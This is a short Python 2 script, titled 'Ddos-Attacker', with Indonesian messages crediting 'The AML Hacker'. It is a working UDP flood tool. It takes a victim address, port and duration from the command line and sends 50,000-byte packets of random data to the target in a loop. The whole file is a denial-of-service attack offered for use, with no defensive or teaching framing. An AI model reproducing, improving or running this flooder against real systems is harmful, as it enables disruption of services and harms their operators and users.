import time
import socket
import random
import sys

def usage():
    print "\033[1;32m#########################################################"
    print "          #--------[\033[1;91mDdos-Attacker\033[1;32m]------------#"
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(50000)
    timeout =  time.time() + duration
    sent = 1

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m mengirim data hack AML .\033[1;91mmengirim paket AML (tolls di buat oleh The AML Hacker)no (sent)"
        print " data berhasil terkirim" 
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()


